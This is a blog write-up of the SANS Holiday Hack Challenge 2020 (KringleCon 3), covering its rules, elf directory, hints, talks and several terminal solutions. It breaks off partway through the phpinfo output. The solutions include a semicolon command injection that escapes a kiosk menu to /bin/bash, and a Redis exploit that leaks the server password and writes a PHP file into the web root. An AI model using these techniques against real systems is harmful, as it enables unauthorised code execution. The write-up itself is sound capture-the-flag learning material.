---
title: "SANs Holiday Hack Challenge - KringleCon 3: French Hens!"
author: "Timothy Loftus (n3s0)"
date: 2020-12-20T00:38:40-06:00
lastmod: 2025-10-26
summary: "Notes from doing SANs Holiday Hack Challenge - KringleCon 3: French Hens."
draft: false
---

### Overview

This is my writeup for SANS KringleCon 2020. This will consist of all of 
the challenges completed during KringleCon 2020 as I progress. Each 
challenge and PI Terminal can be referenced by their location in the castle.

This will include the following:

- KringleCon 2020 Code of Conduct
- KringleCon 2020 Terms of Use
- KringleCon 2020 Elf Directory and Map
- KringleCon 2020 Objectives
- List of Unlocked Items
- Completed Challenges (Per floor and location)

Writing style consists of working through challenges in a separate file 
and then moving them to this document after review.

### KringleCon 3 Code of Conduct

Copied the KringleCon 3 Code of Conduct 

1. Use the challenges here to have fun, explore, engage, and develop 
   your cyber security skills!
2. Be kind! Feel free to encourage and help other players! Let Santa's 
   elves (support@holidayhackchallenge.com) know if something seems off. 
   Please be mindful that there are children playing. Santa is watching!
3. Please don't post full answers publicly until the official contest 
   ends on Monday, January 4, 2021.
4. SANS Holiday Hack strives to create an atmosphere of learning, growth, 
   and community. We value the participation and input, in this event and 
   in the industry, of people of all genders, sexual identities, cultures, 
   socioeconomic backgrounds, races, ethnicities, nationalities, religions, 
   and ages. Please support this atmosphere with respectful behavior 
   and speech. This applies to all online interactions associated with 
   KringleCon and the Holiday Hack Challenge, including game chat and 
   discussions.

### KringleCon 3 Terms of Use

Below are the KringleCon 3 Terms of Use.

1. This service includes a "group chat" component. We cannot make any 
   guarantees about the accuracy, quality, or age-appropriateness of 
   chat messages.
2. All activity and interactions within Holiday Hack Challenge are 
   monitored and recorded. We use this information to maintain an 
   environment that is both safe and conducive to learning.
3. Players should avoid engaging in techniques on any Holiday Hack 
   Challenge server that may negatively affect the server's operational 
   status and/or availability.
4. Players must not attack Holiday Hack Challenge servers 
   (*.holidayhackchallenge.com, *.kringlecon.com, etc.) unless otherwise 
   directed. If you have any questions about target scope, please email: 
   support@holidayhackchallenge.com.
5. E-mail addresses collected will be used in accordance with the SANS 
   Privacy Policy (https://www.sans.org/privacy/).

### KringleCon 3 Elf Directory and Map

#### Elf Directory

Below is a directory of the elves and their locations in Santa's Castle 
and The North Pole.

```sh
Name:                 Floor:   Room:
Ribb Bonbowford       1        Dining Room
Noel Boetie           1        Wrapping Room
Ginger Breddie        1        Castle Entry
Minty Candycane       1.5      Workshop
Angel Candysalt       1        Great Room
Tangle Coalbox        1        Speaker UNPreparedness
Bushy Evergreen       2        Talks Lobby
Holly Evergreen       1        Kitchen
Bubble Lightington    1        Courtyard
Jewel Loggins                  Front Lawn
Sugarplum Mary        1        Courtyard
Pepper Minstix                 Front Lawn
Bow Ninecandle        2        Talks Lobby
Morcel Nougat         2        Speaker UNPreparedness
Wunorse Openslae      R        NetWars Room
Sparkle Redberry      1        Castle Entry
Jingle Ringford                NJTP
Piney Sappington      1        Castle Entry
Chimney Scissorsticks 2        Talks Lobby
Fitzy Shortstack      1        Kitchen
Alabaster Snowball    R        NetWars Room
Eve Snowshoes         3        Santa's Balcony
Shinny Upatree                 Front Lawn
Tinsel Upatree        3        Santa's Office
```

#### Map of Santa's Castle

Below is the map of Santa's Castle at KingleCon 3. Looks like this is 
semi accurate. Looks like the map is incomplete as far as the Workshop 
is concerned.

```sh
__       _    --------------
|__)_  _ (_   | NetWars Room |
| \(_)(_)|    |              |
              |            * |
               --------------

__  __                              __  __
 _)|_                                _)|_          -------
/__|        Tracks                  __)|          |Balcony|
            1 2 3 4 5 6 7                          -------
 -------    -------------                             |
|Speaker|--| Talks Lobby |                        --------
|Unprep |  |             |                       |Santa's |
 -------    ------       |                       |Office  |
                  |      |                        --    --
                  |     *|                          |  |
                   ------                           |   ---
                                                    |    * |
    __                                               ------
 /||_
  ||                                          __ __           --------
  --------------------------              /| |_ |_           |Wrapping|
 |        Courtyard         |              |.__)|            |  Room  |
  --------------------------                                  --------
    |                    |                                       |
 ------    --------    ------                          ---    --------
|Dining|--|Kitchen |--|Great |                            |--|Workshop|
|      |   --------   |      |                            |  |        |
| Room |--|      * |--| Room |                            |  |        |
|      |  |Entryway|  |      |                            |  |        |
 ------    --------    ------                             |  |        |
               |                                             | *      |
           ----------                                         --------
          |Front Lawn|       NOTE: * denotes Santavator
           ----------
```

### Narrative

Below are the narrative entries unlocked in KringleCon.

```
KringleCon back at the castle, set the stage...

But it's under construction like my GeoCities page.

Feel I need a passport exploring on this platform -

Got half floors with back doors provided that you hack more!

Heading toward the light, unexpected what you see next:

An alternate reality, the vision that it reflects.
```

### Hints

Below are the hints that I've notated.

- Terminal Tips 
  - From: Jewel Loggins
  - You can copy and paste in terminals with ```Ctrl-c``` and 
    ```Ctrl-v``` or ```⌘-c``` and ```⌘-v```.
- Filtering Text 
  - From Wunorse Openslae 
  - Terminal: CAN-Bus Investigation
  - You can hide lines you don't want to see with commands like ```cat 
    file.txt | grep -v badstuff```
- CAN Bus Talk 
  - From: Wunorse Openslae 
  - Terminal: CAN-Bus Investigation
  - Chris Elgee is talking about how 
    [CAN traffic](https://www.youtube.com/watch?v=96u-uHRBI0I) works right 
    now!
- Adding to Arrays 
  - From Ribb Bonbowford 
  - Terminal: Programming Concepts
  - ```var array = [2, 3, 4]; array.push(1)``` doesn't do QUITE what was 
    intended...
- Filtered Items 
  - From: Ribb Bonbowford 
  - Terminal: Programming Concepts
  - [There's got to be a way to ```filter``` for specific ```typeof``` items in an array](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/TypedArray/filter). Maybe [the ```typeof``` operator](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/typeof) could also be useful?
- Compressing JS 
  - From: Ribb Bonbowford 
  - Terminal: Programming Concepts -
  - There are lots of ways to [make your code shorter](https://jscompress.com/), but the number of elf commands is key.
- JavaScript Primer 
  - From: Ribb Bonbowford 
  - Terminal: Programming Concepts
  - Want to learn a useful language? [JavaScript](https://jgthms.com/javascript-in-14-minutes/) is a great place to start! You can also test out your code using a [JavaScript playground](https://playcode.io/).
- JavaScript Loop 
  - From: Ribb Bonbowford 
  - Terminal: Programming Concepts
  - Did you try the JavaScript primer? There's a great section on looping.
- Getting a Key Name 
  - From: Ribb Bonbowford 
  - Terminal: Programming Concepts
  - [In JavaScript you can enumerate an object's keys using ```keys```, and filter the array using ```filter```](https://stackoverflow.com/questions/9907419/how-to-get-a-key-in-a-javascript-object-by-its-value).
- Patience and Timing
  - From: Holly Evergreen
  - Objective: 8) Broken Tag Generator
  - Remember, the processing happens in the background so you might need to wait a bit after exploiting but before grabbing the output!
- Redirect to Download
  - From: Holly Evergreen
  - Objective: 8) Broken Tag Generator
  - If you find a way to execute code blindly, I bet you can redirect to a file then download that file!
- Source Code Analysis
  - From: Holly Evergreen
  - Objective: 8) Broken Tag Generator
  - I'm sure there's a vulnerability in the source somewhere... surely Jack wouldn't leave their mark?
- Content-Type Gotcha
  - From: Holly Evergreen
  - Objective: 8) Broken Tag Generator
  - If you're having trouble seeing the code, watch out for the Content-Type! Your browser might be trying to help (badly)!
- Endpoint Exploration
  - From: Holly Evergreen
  - Objective: 8) Broken Tag Generator
  - Is there an endpoint that will print arbitrary files?
- Download File Mechanism
  - From: Holly Evergreen
  - Objective: 8) Broken Tag Generator
  - Once you know the path to the file, we need a way to download it!
- Error Page Message Disclosure
  - From: Holly Evergreen
  - Objective: 8) Broken Tag Generator
  - Can you figure out the path to the script? It's probably on error pages!
- Source Code Retrieval
  - From: Holly Evergreen
  - Objective: 8) Broken Tag Generator
  - We might be able to find the problem if we can get source code!
- CAN ID Codes 
  - From: Wunorse Openslae 
  - Objective: 7) Solve the Sleigh's CAN-D-BUS Problem
  - Try filtering out one CAN-ID at a time and create a table of what each might pertain to. What's up with the brakes and doors?
- Image Edit Tool 
  - From: Jingle Ringford 
  - Objective: 1) Uncover Santa's Gift List
  - There are [tools](https://www.photopea.com/) out there that could help Filter the Distortion that is this Twirl.
- Twirl Area 
  - From: Jingle Ringford 
  - Objective: 1) Uncover Santa's Gift List
  - Make sure you Lasso the correct twirly area.
- Santavator Operations 
  - From: Pepper Minstix 
  - Objective: 4) Operate the Santavator
  - It's really more art than science. The goal is to put the right colored light into the receivers on the left and top of the panel.
- Electron ASAR Extraction 
  - From: Sugarplum Mary 
  - Objective: 3) Point-of-Sale Password Recovery
  - There are [tools](https://www.npmjs.com/package/asar) and [guides](https://medium.com/how-to-electron/how-to-get-source-code-of-any-electron-application-cbb5c7726c37) explaining how to extract ASAR from Electron apps.
- Election Applications
  - From: Sugarplum Mary
  - Objective: 3) Point-of-Sale Password Recovery
  - It's possible to extract the source code from an [Electron](https://www.electronjs.org/) app.
- Reading Badges with Proxmark 
  - From: Bushy Evergreen 
  - Objective: 5) Open HID Lock
  - You can use a Proxmark to capture the facility code and ID value of HID ProxCard badge by running ```lf hid read``` when you are close enough to someone with a badge.
- What's a Proxmark? 
  - From: Busy Evergreen 
  - Objective: 5) Open HID Lock
  - The Proxmark is a multi-function RFID device, capable of capturing and replaying RFID events.
- Finding Santa's Package
  - From: Shinny Upatree
  - Objective: 2) Investigate S3 Bucket
  - Find Santa's package file from the cloud storage provider. Check Josh Wright's [talk](https://www.youtube.com/watch?v=t4UzXx5JHk0) for more tips!
- Santa's Wrapper3000
  - From: Shinny Upatree
  - Objective: 2) Investigate S3 Bucket
  - Santa's Wrapper3000 is pretty buggy. It uses several compression tools, binary to ASCII conversion, and other tools to wrap packages.
- Finding S3 Buckets
  - From: Shinny Upatree
  - Objective: 2) Investigate S3 Bucket
  - Robin Wood wrote up a guide about [finding these open S3 buckets](https://digi.ninja/blog/whats_in_amazons_buckets.php).
- Leaky AWS S3 Buckets
  - From: Shinny Upatree
  - Objective: 2) Investigate S3 Bucket
  - It seems like there's a new story every week about data exposed through unprotected [Amazon S3 buckets](https://www.computerweekly.com/news/252491842/Leaky-AWS-S3-bucket-once-again-at-centre-of-data-breach)
- Bucket_finder.rb
  - From: Shinny Upatree
  - Objective: 2) Investigate S3 Bucket
  - He even wrote a tool to [search for unprotected buckets](https://digi.ninja/projects/bucket_finder.php)!
- Redis RCE
  - From: Holly Evergreen
  - Terminal: Redis Bug Hunt
  - [This](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis) is kind of what we're trying to do...
- JavaScript Regex Cheat Sheet
  - From: Minty Candycane
  - Terminal: Regex Toy Sorting
  - Handy quick reference for JS regular expression construction: [https://www.debuggex.com/cheatsheet/regex/javascript](https://www.debuggex.com/cheatsheet/regex/javascript)
- Regex Practice
  - From: Minty Candycane
  - Terminal: Regex Toy Sorting
  - Here's a place to try out your JS Regex expressions: [https://regex101.com/](https://regex101.com/)
- Command Injection
  - From: Shinny Upatree
  - Terminal: Kringle Kiosk
  - There's probably some kind of [command injection](https://owasp.org/www-community/attacks/Command_Injection) vulnerability in the menu terminal.
- Mersenne Twister
  - From: Tangle Coalbox
  - Terminal: Snowball Game
  - Python uses the venerable Mersenne Twister algorithm to generate PRNG values after seed. Given enough data, an attacker might [predict](https://github.com/kmyk/mersenne-twister-predictor/blob/master/readme.md) upcoming values.
- Twisted Talk
  - From: Tangle Coalbox
  - Terminal: Snowball Game
  - Tom Liston is giving two talks at once - amazing! One is about the [Mersenne Twister](https://www.youtube.com/watch?v=Jo5Nlbqd-Vg).
- PRNG Seeding
  - From: Tangle Coalbox
  - Terminal: Snowball Game
  - While system time is probably most common, developers have the option to [seed](https://docs.python.org/3/library/random.html) pseudo-random number generators with other values.
- Extra Instances
  - From: Tangle Coalbox
  - Terminal: Snowball Game
  - Need extra Snowball Game instances? Pop them up in a new tab from [https://snowball2.kringlecastle.com](https://snowball2.kringlecastle.com).
- Strings in Binary Files
  - From: Bushy Evergreen
  - Terminal: Speaker UNPrep
  - The ```strings``` command is common in Linux and available in Windows as part of SysInternals.
- Letting a Program Decrypt for You
  - From: Bushy Evergreen
  - Terminal: Speaker UNPrep
  - While you have to use the ```lights``` program in ```/home/elf/``` to turn the lights on, you can delete parts in ```/home/elf/lab/```.
- Tmux Cheat Sheet
  - From: Pepper Minstix
  - Terminal: Unescape Tmux
  - There's a handy tmux reference available at [https://tmuxcheatsheet.com/](https://tmuxcheatsheet.com/)!

### Collected Items

Below are collected items throughout the castle grounds and inside of the castle. Notes will be provided with their use if I find one for the item.

- Large Marble
  - Description: It's a marble...that attracts sparkles.

### Talks

Below is a list of talks at the online conference KringleCon 3.

1. Track 1 - START HERE: Welcome and Tips
  - Speaker(s): Ed Skoudis
  - Description: In this presentation, Ed welcomes you to the 2020 SANS Holiday Hack Challenge, orienting you to the environment, the characters, the storyline, and the super useful KringleCon 3 snowflake badge. He gives tips for navigating Santa’s castle and its interface, as well as ways to chat with other participants and get hints. In 18 short minutes, Ed provides you all the information you need to get rolling in this year's super exciting Holiday Hack extravaganza!
  - Link: [Talk Link](http://www.youtube.com/watch?v=8e0SZrbWFuU)
2. Track 2 - CAN Bus Can-Can
  - Speaker(s): Chis Elgee
  - Description: Riddle: what connects your steering wheel to your door locks and your radio? It's the CAN bus! Let's examine what this low-level network does and finally find out what our cars are thinking!
  - Link: [Talk Link](http://www.youtube.com/watch?v=96u-uHRBI0I)
3. Track 2 - Open S3 Buckets: Still a Problem in 2020
  - Speaker(s): Josh Wright
  - SANS Senior Instructor Joshua Wright delivers a lightning talk about what you need to know about insecure cloud storage discovery, enumeration, and the opportunities to make money through creative assessment of cloud resources.
  - http://www.youtube.com/watch?v=t4UzXx5JHk0
4. Track 3 - Adversary Emulation and Automation
  - Speaker(s): Dave Herrald
  - Learn a quick, easy, and free way to emulate adversary techniques selected from MITRE ATT&CK® and the Atomic Red Team project. We'll show how the resulting telemetry can be collected for analysis and detection engineering using Splunk
  - [Talk Link](http://www.youtube.com/watch?v=RxVgEFt08kU)
5. Track 3 - Working with the Official Naughty/Nice Blockchain
  - Speaker(s): Qwerty Petabyte
  - In this talk, part of Elf U's "Assessing and Evaluating Human Behavior for Naughty/Niceness" curriculum, Professor Petabyte outlines blockchain technology, and specifically outlines how the North Pole uses blockchains to ensure the integrity of the Naughty/Nice list, gives an overview of the data stored on the Naughty/Nice blockchain, and talks about the current two year project to update the North Pole's blockchain code.
  - [Talk Link](http://www.youtube.com/watch?v=reKsZ8E44vw)
6. Track 4 - HID Card Hacking
  - Speaker(s): Larry Pesce
  - The HID ProxCard II RFID cards are arguably the most deployed physical access control systems. In this talk we'll give you the quick technical run down on the technology and how we can interact with them for shenanigans with a Proxmark 3.
  - [Talk Link](http://www.youtube.com/watch?v=647U85Phxgo)
7. Track 4 - Rudolph the Red-Nosed Raptor: Acquiring Triage Images via EDR
  - Speaker(s): Dan Banker
  - Velocidex has created a fantastic (free!) tool called Velociraptor; in their own words, it "...provides the next generation in endpoint monitoring, digital forensic investigations and cyber incident response." One capability is that the user can specify an array of forensic artifacts to be collected, and Velociraptor will produce an executable. The executable is run on the target machine, and the artifacts are collected and a report is generated. This is a quick way of generating a triage image, i.e. grabbing the juicy system artifacts without copying an entire drive. I will explore the deployment of velociraptor.exe with the live response capability of EDR (specifically Carbon Black). I will demonstrate how this is done and point out a couple of pitfalls. I will also talk about how to automate this process.
  - [Talk Link](http://www.youtube.com/watch?v=VWDiA6WspSM)
8. Track 5 - Give Yourself a Blog for Christmas
  - Speaker(s): Jack Rhysider
  - Everyone in IT has notes they've written for things they should remember. Commands that are hard to remember, tips for how to configure something, or troubleshooting techniques. The best place to put those notes is into a blog. This talk will cover the reasons why everyone in IT should be writing a blog, and what to put in it. Even if you're just starting your career or haven't yet started it. The beginners mind is a beautiful thing and can sometimes explain things better than expert can.
  - [Talk Link](http://www.youtube.com/watch?v=NKHF5VZmCig)
9. Track 5 - Red Teaming: Why Organizations Hack Themselves
  - Speaker(s): David Tomaschik
  - Penetration testing and red teaming are popular, high-visibility specialties in the information security space, but why do organizations do these, and how are they executed? We'll discuss the phases and execution of a Red Team exercise and how the results help the organization's overall security posture.
  - [Talk Link](http://www.youtube.com/watch?v=2ejR8ITe_uA)
10. Track 6 - Attacking and Hardening Kubernetes
  - Speaker(s): Jay Beale
  - Come see a Kubernetes attack demonstration, where a hostile developer must escalate privilege to steal data from a GKE Kubernetes cluster and its cloud environment. Whether you're completely new to Kubernetes or you've used it, but not yet attacked it, you'll enjoy and learn something useful from this talk. Afterwards, download the slides from InGuardians.com and learn about using admission controllers to block the attack!
  - [Talk Link](http://www.youtube.com/watch?v=S4ySed0k7uE)
11. Track 6 - IOMs and IOAs in AWS
  - Speaker(s): Spencer Gietzen
  - There is a lot of buzz in the public cloud industry around indicators of misconfigurations, detecting them, and responding to them, but there is one important area that is lacking the same support, indicators of attack. It is important to know when there is a potential for a breach in your cloud environment, but you also need to know what malicious activity may look like after a breach. This talk will cover what Indicators of Misconfigurations (IOMs) and Indicators of Attack (IOAs) are, why they are important to differentiate, and the differences between them using Amazon Web Services (AWS) as an example.
  - [Talk Link](http://www.youtube.com/watch?v=KliCQbJT6YQ)
12. Track 7 - Offensive Security Tools: Providing Value with the C2 Matrix
  - Speaker(s): Jorge Orchilles
  - Offensive Security has always been about providing value. This talk goes through the history of ethical hacking through red team, purple team, and adversary emulation. Choosing the correct tools for the job has always been an important preparation step; with the C2 Matrix, you can quickly choose the best one for your needs. Lastly, we release an update for the SANS Slingshot C2 Matrix Edition virtual machine which includes multiple C2s preinstalled to get you up and running quickly. It also includes VECTR to measure, track, and show the progress made in your Red Team and Purple Team programs.
  - [Talk Link](http://www.youtube.com/watch?v=CcteG3Z2nCU)
13. Track 7 - Random Facts About Mersenne Twisters
  - Speaker(s): Tom Liston
  - An introduction to the properties and pitfalls of one of the most widely deployed pseudo-random number generators (PRNGs), the Mersenne Twister, MT19937. Along with this presentation, Tom is releasing some Python code, demonstrating how to clone the PRNG used by the Random module in both Python 2 and Python 3. (https://github.com/tliston/mt19937)
  - [Talk Link](http://www.youtube.com/watch?v=Jo5Nlbqd-Vg)

### Raspberry Pi Terminals

#### F1 - Font Lawn - Unescape Tmux

Can you help me?

I was playing with my birdie (she's a Green Cheek!) in something 
called tmux, then I did something and it disappeared!

Can you help me find her? We were so attached!!

##### Solution

Utilized the tmux cheet sheet for this. There is a hint provided by Pepper Minstix that provides a cheet sheet for Tmux.

Listed the what tmux terminals are running using the folowing command. Looks like there's one running at the moment.

```sh
elf@b440204e0f3b:~$ tmux ls
0: 1 windows (created Sun Dec 20 09:24:40 2020) [80x24]
```

Used the following command to open a tmux session with session 0 attached.

```sh
elf@b440204e0f3b:~$ tmux attach -t 0
```

Looks like that worked. Below is the output from the terminal for confirmation.

```tmux
.............................'.''''''.'''''''''''''
.........................................'''''''''''
................................,:lccc:;,'...'''''''
.............................';loodxkkxxdlc;'..'''''
............................,:ccllcldx0dxxdoc..'''''
...........................;ccclooodkOkok0OOx:..''''
.........................':cccllodxxkkkOkxdxx;....''
........................,cccllooddxkOOOkOxoo'.....''
......................';:cclllccllodO0Okkkx;...'''..
.....................:llollclclccccclokc::'.........
...................;ddollllllllcccccccl;............
..................:xdooddoooolclllllolld;...........
.................'xxoodxxxdoooooooxkdooox'..........
.................,xxkxdxkkxxdddddddxkkxdxl....'.....
.................'xOkooddxkkxxdddxxkkxxxxx'.......'.
..................oOkddxkkkkdxxdddxxxxxxdd:......'.'
.................';k0xxkxxOxdddddoodxdxkkx:....'''''
................'',o0xdddxkxdxdodddddkkkxxc....'''''
................',,:OK0kkOOxddddxxxddxxkxd:'''''''''
.............',;:cccdKXKOkkOOxkxdxxxxxxkOx;'''''''''
...........:oxdddxkkxOXXOxxkxxkkkkkkkxxdxx,,''''''''
.......''':c:,..'coodOO00OOOO00kxOkK0KkO0d,,''''''''
...;cllc::clddooddOkxoccccccloddxxO0KK0KKOc:;,''''''
'ldolcc:::lldxkOxkO000OOOOkkxxdddxoooooooooodxxxddol
xxlcc:::::xolldddxOOdddxxxkkOOO0000000xkOkkxddoooooo
lo:::cccc::ldoodooxd,;lxxkkO0OOOOOOOOOOOOOO000000000
locclccccccccldkxdkk:,;cdxkOKXXXKKKKKXXKk::::cllodxk
xxollllcccllcodkOkO0:,,,:dkOOKKXXXKKKXXKl,,'''''''''
xxkolllllllllodkO0KO;,,,;;lxO00KKXKKKKK0c;,,,,,,,,,,
,dxxxdoooollodxk0KOolc:::::cdO00KK00K000c;,,,,,,,,,;
..:xkOOkdoxxkOO0OxoooooolooodxOO00Ok0kk0oc:;;;;;;;;;
....:dkOddOO0OkdoolllllloooddxOOOOOkkkkOdllccccccccc
You found her! Thank you!!!
[0] 0:bash*                                          "1e8c365d495d" 09:23 20-Dec-20
```

#### F1 - Front Lawn - Kringle Kiosk

Welcome to our castle, we're so glad to have you with us!
Come and browse the kiosk; though our app's a bit suspicious.
Poke around, try running bash, please try to come discover,
Need our devs who made our app pull/patch to help recover?

Escape the menu by launching /bin/bash

Press enter to continue...

##### Solution

The challenge starts out with a menu and a warning stating that anything other than the required input will provide an unwanted output.

```sh
~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Welcome to the North Pole!
~~~~~~~~~~~~~~~~~~~~~~~~~~~~
1. Map
2. Code of Conduct and Terms of Use
3. Directory
4. Print Name Badge
5. Exit


Please select an item from the menu by entering a single number.
Anything else might have ... unintended consequences.

Enter choice [1 - 5]
```

I have gone through the challenge and obtained the map of the castle, code of conduct terms of use, and the directory of elves. Which will come in handy. This has been provided in another version of the file. I had a hunch about the "Print Name Badge" option. Turns out that you can enter a bash shell when you enter the option and type in your name ```n3s0 ; /bin/bash```.

```sh
Enter choice [1 - 5] 4
Enter your name (Please avoid special characters, they cause some weird errors)...n3s0 ; /bin/bash
 ______
< n3s0 >
 ------
  \
   \   \_\_    _/_/
    \      \__/
           (oo)\_______
           (__)\       )\/\
               ||----w |
               ||     ||

   ___                                                      _    
  / __|   _  _     __      __      ___     ___     ___     | |   
  \__ \  | +| |   / _|    / _|    / -_)   (_-<    (_-<     |_|   
  |___/   \_,_|   \__|_   \__|_   \___|   /__/_   /__/_   _(_)_  
_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_| """ | 
"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 

Type 'exit' to return to the menu.
```

Now, I'm curious how it works and why it's possible to inject other commands. It looks like there's a script named ```welcome.sh``` in shinny's home directory. Looks like anyone can read it. So, lets go.

```sh
shinny@45dd48003c79:~$ ls -la
total 32
drwxr-xr-x 1 shinny shinny 4096 Dec 20 21:26 .
drwxr-xr-x 1 root   root   4096 Dec 14 17:53 ..
-rw------- 1 shinny shinny    5 Dec 20 21:26 .bash_history
-rw-r--r-- 1 shinny shinny  220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 root   root    120 Dec  5 00:00 .bashrc
-rw-r--r-- 1 shinny shinny  807 Apr 18  2019 .profile
-rwxr-xr-x 1 root   root   2528 Dec  6 12:24 welcome.sh
```

Decided to copy the script into this and review. Yes, I shamelessly pulled the data outputted from this script into this writeup. It has been one of the most helpful things for this writeup and its structure.

I think the reason I could escape using because the contents of the variable contained a semicolon. So, it will treat it as a command sparator when the ```cowsay``` command is being issued and run stuff like ```/bin/bash``` providing a shell. The read command will look for any other escape characters but, when the command is run into the cowsay command and it runs it will treat the semicolon as the end of the command and run the next command that's entered. In this case ```/bin/bash```.

If I'm wrong. Please correct me.

```sh
#!/bin/bash
declare -x LAST_ORDER
LAST_ORDER=''
# https://bash.cyberciti.biz/guide/Menu_driven_scripts
# A menu driven shell script sample template
## ----------------------------------
# Step #1: Define variables
# ----------------------------------
RED='\033[0;41;30m'
STD='\033[0;0;39m'
# ----------------------------------
# Step #2: User defined function
# ----------------------------------
pause() {
  read -r -p "Press [Enter] key to continue..." fackEnterKey
}
one() {
  cat /opt/castlemap.txt
  pause
}
two() {
  more /opt/coc.md
  pause
}
three() {
  cat /opt/directory.txt
  pause
}
four() {
  read -r -p "Enter your name (Please avoid special characters, they cause some weird errors)..." name
  if [ -z "$name" ]; then
    name="Santa\'s Little Helper"
  fi
  bash -c "/usr/games/cowsay -f /opt/reindeer.cow $name"
  pause
}
surprise(){
  cat /opt/plant.txt
  echo "Sleeping for 10 seconds.." && sleep 10
}
# function to display menus
show_menus() {
  clear
  echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
  echo " Welcome to the North Pole!"
  echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
  echo "1. Map"
  echo "2. Code of Conduct and Terms of Use"
  echo "3. Directory"
  echo "4. Print Name Badge"
  echo "5. Exit"
  echo
  echo
  echo "Please select an item from the menu by entering a single number."
  echo "Anything else might have ... unintended consequences."
  echo
}
# read input from the keyboard and take a action
read_options() {
  local choice
  read -r -p "Enter choice [1 - 5] " choice
  case $choice in
  1*) one ;;
  2*) two ;;
  3*) three ;;
  4*) four $choice ;;
  5) exit 0 ;;
  plant) surprise c;;
  *) echo -e "${RED}Error...${STD}" && sleep 2 ;;
  esac
}
# ----------------------------------------------
# Step #3: Trap CTRL+C, CTRL+Z and quit singles
# ----------------------------------------------
trap '' SIGINT SIGQUIT SIGTSTP
# -----------------------------------
# Step #4: Show opening message once
# ------------------------------------
echo
echo Welcome to our castle, we\'re so glad to have you with us!
echo Come and browse the kiosk\; though our app\'s a bit suspicious.
echo Poke around, try running bash, please try to come discover,
echo Need our devs who made our app pull/patch to help recover?
echo
echo "Escape the menu by launching /bin/bash"
echo
echo
read -n 1 -r -s -p $'Press enter to continue...'
clear
# -----------------------------------
# Step #5: Main logic - infinite loop
# ------------------------------------
while true; do
  show_menus
  read_options
done
```

Looks like if you enter the word plant. It will provide the following output. There you go. Read the code, get a plant named Jason.

```sh
 Hi, my name is Jason the Plant!

  ( U
   \| )
  __|/
  \    /
   \__/ ejm96
``` 

#### F1 - Kitchen - Redis Bug Hunt

We need your help!!

The server stopped working, all that's left is the maintenance port.

To access it, run:

curl http://localhost/maintenance.php

We're pretty sure the bug is in the index page. Can you somehow use the
maintenance page to view the source code for the index page?

##### Solution

In this challenge you need to read the source code for the file ```index.php```. There is a hint stating that there may be an RCE vulnerability in this Reddis server. To be able to work with the server, I will need to utilize the maintenance page at ```http://localhost/maintenance.php```.

To start out I need to take a look at functionality and what not. So, I start out by checking some things on the server. First to make sure the mainenance page works. Used the ```ping``` command using the mainenance page and it looks like it does.

The fact that this mainenance page utilizes the ```redis-cli``` command and is password protected, I might not have to use the maintenance page that has been provided if I can obtain the credentials.

```sh
player@da47331f1c25:~$ curl http://localhost/maintenance.php?cmd=ping
Running: redis-cli --raw -a '<password censored>' 'ping'
PONG
```

Checked the info for the server and it looks like this is a prtty standard server on the default port ```6379```. The Redis version is ```Redis 5.0.3```. I checked for some CVEs for this version of Redis and it doesn't look like there's a CVE for this vulnerability.

```sh
player@61e8c9c01a21:~$ curl http://localhost/maintenance.php?cmd=info      
Running: redis-cli --raw -a '<password censored>' 'info'
# Server
redis_version:5.0.3
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:1b271fe49834c463
redis_mode:standalone
os:Linux 4.19.0-13-cloud-amd64 x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:8.3.0
process_id:6
run_id:71e3f351684cd7d0555c1e4fc441a8b696089a6b
tcp_port:6379
uptime_in_seconds:121
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:15866641
executable:/usr/bin/redis-server
config_file:/usr/local/etc/redis/redis.conf
```

Decided to see if I could obtain the configuration for the server. Looks like the the password is available in the configuration and it is ```R3disp@ss```. Looks like the server directory is root maybe? I'm not sure. The command below will obtain the full configuration for the server.

```sh
player@da47331f1c25:~$ curl http://localhost/maintenance.php?cmd=config,get,*
Running: redis-cli --raw -a '<password censored>' 'config' 'get' '*'

dbfilename
dump.rdb
requirepass
R3disp@ss
masterauth
SNIPPED
dir
/
save
SNIPPED
```

Now, is the ```redis-cli``` command available to me? Looks like it is.

```sh
player@33c984ced50f:~$ whereis redis-cli
redis-cli: /usr/bin/redis-cli
```

Below is me confirming that I can login to the Redis server using the ```redis-cli``` command.

```sh
player@33c984ced50f:~$ redis-cli -a R3disp@ss -h 127.0.0.1
Warning: Using a password with '-a' or '-u' option on the command line interface may n
ot be safe.
127.0.0.1:6379> 
```

Now it's time to test for the RCE vulnerability. The hints provided by Santa's Elf Holly Evergreen provided some insight on how to perform the exploitation of the vulnerability. Take note that this is not something that you want people to be able to do. If you look closer, I shouldn't even be able to access the /var/www/html directory. See below.

```sh
player@61e8c9c01a21:~$ ls /var/www/html
ls: cannot open directory '/var/www/html': Permission denied
```

But, in the steps below I'm able to do the following.

1. Changing the dir for Redis to ```/var/www/html```. (The webservers root directory.)
2. Setting the dbfilename to testing.php which will house our code.
3. Create a test with the code ```"<?php phpinfo(); ?>"``` which will provide the PHP info for the host.
4. Save the cofniguration.
5. Exit the Redis CLI.

```sh
127.0.0.1:6379> config set dir /var/www/html
OK
127.0.0.1:6379> config set dbfilename testing.php
OK
127.0.0.1:6379> set test "<?php phpinfo(); ?>"
OK
127.0.0.1:6379> save
OK
127.0.0.1:6379> exit
```

Now to test that the exploit works. Looks like it does. Below is the output from the ```phpinfo()``` function. Now it's time to see if I can take this a step further and continue to push the boundries of this.

```sh
player@33c984ced50f:~$ curl --output - http://localhost/testing.php
REDIS0009�      redis-ver5.0.3�
�edis-bits�@�ctime�u�_used-mem�x
 aof-preamble��� test <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "
DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head>
<style type="text/css">
body {background-color: #fff; color: #222; font-family: sans-serif;}
pre {margin: 0; font-family: monospace;}
